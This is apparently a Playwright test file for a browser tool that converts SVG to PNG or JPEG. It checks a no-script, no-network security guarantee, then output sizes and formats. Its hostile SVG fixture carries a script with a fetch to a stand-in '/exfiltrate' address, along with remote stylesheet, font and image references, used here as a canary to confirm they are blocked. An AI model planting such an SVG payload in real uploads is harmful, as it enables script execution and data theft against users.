import { test, expect, type Page } from '@playwright/test';
import fs from 'node:fs';
import { decodedSize } from '../../lib/browser-image';
import { quiet } from '../../lib/engine';

/**
 * Tool-level functional tests for SVG to Image.
 *
 * Most of this tool is arithmetic about size, and that is tested below. But
 * the part worth writing tests for first is a security guarantee, because an
 * SVG is not a picture - it is a document that can carry a script and a remote
 * address. src/render.js leans on that deliberately:
 *
 *   "An SVG loaded through an <img> is in what the specification calls secure
 *    static mode. Scripts inside it do not run. External references - an
 *    `<image href="https://...">`, a stylesheet, a webfont, an `@import` - are
 *    not fetched. For a tool that promises your files go nowhere, that is not
 *    a limitation to work around, it is the guarantee doing its job."
 *
 * If that ever stopped holding - a well-meaning change to <object>, or to an
 * inline <svg> element, would do it - then opening a hostile SVG would run its
 * script on this origin and fetch its remote addresses, and the page would
 * look exactly the same while doing it. So the first tests here hand the tool
 * a deliberately hostile file and watch what the browser does.
 */

const URL_PATH = '/svg-to-image/';

/**
 * An SVG that tries every route out of the page that the comment above says is
 * closed: a script, a remote image, a remote stylesheet, an @import, and a
 * webfont. Every address points at a host that does not resolve, so a request
 * that escapes shows up as an attempt rather than as a hang.
 */
const HOSTILE_HOST = 'svg-exfiltration-canary.invalid';
const HOSTILE_SVG = `<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
     width="200" height="120" viewBox="0 0 200 120">
  <?xml-stylesheet type="text/css" href="https://${HOSTILE_HOST}/sheet.css"?>
  <style>
    @import url("https://${HOSTILE_HOST}/imported.css");
    @font-face { font-family: Canary; src: url("https://${HOSTILE_HOST}/font.woff2"); }
    text { font-family: Canary, sans-serif; }
  </style>
  <script type="application/javascript">
    // Should never run. If it does, both of these are observable.
    window.__svgScriptRan = true;
    try { fetch("https://${HOSTILE_HOST}/exfiltrate"); } catch (e) {}
  </script>
  <rect width="200" height="120" fill="#204080"/>
  <image href="https://${HOSTILE_HOST}/remote.png" x="0" y="0" width="80" height="80"/>
  <image xlink:href="https://${HOSTILE_HOST}/legacy.png" x="90" y="0" width="80" height="80"/>
  <text x="10" y="110" fill="white">canary</text>
</svg>
`;

/** A plain SVG with a known size, for the arithmetic. */
const svgOf = (width: number, height: number): string => `<svg xmlns="http://www.w3.org/2000/svg"
  width="${width}" height="${height}" viewBox="0 0 ${width} ${height}">
  <rect width="${width}" height="${height}" fill="#3366cc"/>
  <circle cx="${width / 2}" cy="${height / 2}" r="${Math.min(width, height) / 3}" fill="#ffcc00"/>
</svg>`;

async function load(page: Page, svg: string, name = 'drawing.svg'): Promise<void> {
  await page.locator('#file-input').setInputFiles({
    name,
    mimeType: 'image/svg+xml',
    buffer: Buffer.from(svg, 'utf8'),
  });
  await expect(page.locator('#file-list li')).toHaveCount(1, { timeout: 20_000 });
  await expect(page.locator('#load-error')).toBeHidden();
}

/** Rasterize and return the bytes the browser saved. */
async function rasterize(page: Page): Promise<Buffer> {
  await expect(page.locator('#run')).toBeEnabled({ timeout: 20_000 });
  const pending = page.waitForEvent('download');
  await page.locator('#run').click();
  await expect(page.locator('#results')).toBeVisible({ timeout: 30_000 });
  await page.locator('#results a[download]').first().click();

  const saved = await pending;
  const path = await saved.path();
  if (!path) throw new Error('the browser saved no file');
  return fs.readFileSync(path);
}

test.describe('svg-to-image: a hostile SVG cannot act', () => {
  test('its script does not run and its remote addresses are not fetched', async ({ page }) => {
    const attempted: string[] = [];
    page.on('request', (req) => {
      if (req.url().includes(HOSTILE_HOST)) attempted.push(req.url());
    });

    await page.goto(URL_PATH);
    await load(page, HOSTILE_SVG, 'hostile.svg');

    // Rasterizing is the moment the file is handed to a decoder, so the check
    // has to survive it rather than stop at loading.
    const png = await rasterize(page);
    await quiet(page);

    expect(attempted, `the SVG reached ${HOSTILE_HOST}`).toEqual([]);

    const ranOnThisPage = await page.evaluate(() => '__svgScriptRan' in window);
    expect(ranOnThisPage, 'the SVG\'s script ran on this origin').toBe(false);

    // And it still drew: the guarantee is not "refuse the file", it is "draw
    // it with none of that working".
    const size = await decodedSize(page, png, 'image/png');
    expect(size.width).toBeGreaterThan(0);
    expect(size.height).toBeGreaterThan(0);
  });

  test('nothing about the file leaves the page either', async ({ page }) => {
    // Looked for by a marker unique to this drawing rather than by words like
    // "svg" or "png". The analytics tag legitimately reports the address and
    // title of the page being viewed - which for this tool are
    // "/svg-to-image/" and "SVG to PNG ..." - so a pattern that broad flags
    // the tool's own name and says nothing about the file.
    const canary = 'canary-a7f3e91d-not-for-sending';
    const svg = `<svg xmlns="http://www.w3.org/2000/svg" width="120" height="80"
      viewBox="0 0 120 80"><title>${canary}</title>
      <rect width="120" height="80" fill="#3366cc"/>
      <text x="6" y="44" font-size="9">${canary}</text></svg>`;

    const traffic: string[] = [];
    page.on('request', (req) => {
      traffic.push(`${req.method()} ${req.url()} ${(req.postData() ?? '').slice(0, 8000)}`);
    });

    await page.goto(URL_PATH);
    await load(page, svg, 'private.svg');
    await rasterize(page);
    await quiet(page);

    for (const entry of traffic) {
      expect(entry, 'the drawing was sent').not.toContain(canary);
      expect(entry, 'the drawing was sent url-encoded')
        .not.toContain(encodeURIComponent(canary));
    }
  });
});

test.describe('svg-to-image: the size you name is the size you get', () => {
  test.beforeEach(async ({ page }) => {
    await page.goto(URL_PATH);
  });

  test('a width in pixels is exact, and the height follows the shape', async ({ page }) => {
    // A 200 x 100 drawing at 1024 wide must come out 1024 x 512. Getting the
    // aspect wrong here is the difference between a sharp asset and a squashed
    // one, and both look plausible in a file listing.
    await load(page, svgOf(200, 100));
    await page.locator('#size-mode').selectOption('width');
    await page.locator('#size-width').fill('1024');

    const size = await decodedSize(page, await rasterize(page), 'image/png');
    expect(size.width).toBe(1024);
    expect(size.height).toBe(512);
  });

  test('a height in pixels is exact too', async ({ page }) => {
    await load(page, svgOf(200, 100));
    await page.locator('#size-mode').selectOption('height');
    await page.locator('#size-height').fill('300');

    const size = await decodedSize(page, await rasterize(page), 'image/png');
    expect(size.height).toBe(300);
    expect(size.width).toBe(600);
  });

  test('the longest side is applied to whichever side is longest', async ({ page }) => {
    await load(page, svgOf(100, 400), 'tall.svg');
    await page.locator('#size-mode').selectOption('longest');
    await page.locator('#size-longest').fill('800');

    const size = await decodedSize(page, await rasterize(page), 'image/png');
    expect(size.height).toBe(800);
    expect(size.width).toBe(200);
  });

  test('a multiple of the file\'s own size means what it says', async ({ page }) => {
    await load(page, svgOf(150, 75));
    await page.locator('#size-mode').selectOption('scale');
    await page.locator('#size-scale').fill('4');

    const size = await decodedSize(page, await rasterize(page), 'image/png');
    expect(size.width).toBe(600);
    expect(size.height).toBe(300);
  });

  test('enlarging enormously is allowed, because a vector has nothing to lose', async ({ page }) => {
    // The README's opening argument: there is no "never enlarge" rule here,
    // and 4000 pixels from a 24-pixel icon is exactly as sharp as 24 was.
    await load(page, svgOf(24, 24), 'icon.svg');
    await page.locator('#size-mode').selectOption('width');
    await page.locator('#size-width').fill('2048');

    const size = await decodedSize(page, await rasterize(page), 'image/png');
    expect(size.width).toBe(2048);
    expect(size.height).toBe(2048);
    await expect(page.locator('#size-warning')).toBeHidden();
  });

  test('the chosen format is the format that comes out', async ({ page }) => {
    await load(page, svgOf(100, 100));
    await page.locator('#size-mode').selectOption('width');
    await page.locator('#size-width').fill('128');
    await page.locator('#format').selectOption('image/jpeg');

    const bytes = await rasterize(page);
    // A JPEG starts FF D8 FF; a PNG starts with its own eight-byte signature.
    expect(bytes.subarray(0, 3)).toEqual(Buffer.from([0xff, 0xd8, 0xff]));

    const size = await decodedSize(page, bytes, 'image/jpeg');
    expect(size.width).toBe(128);
  });
});
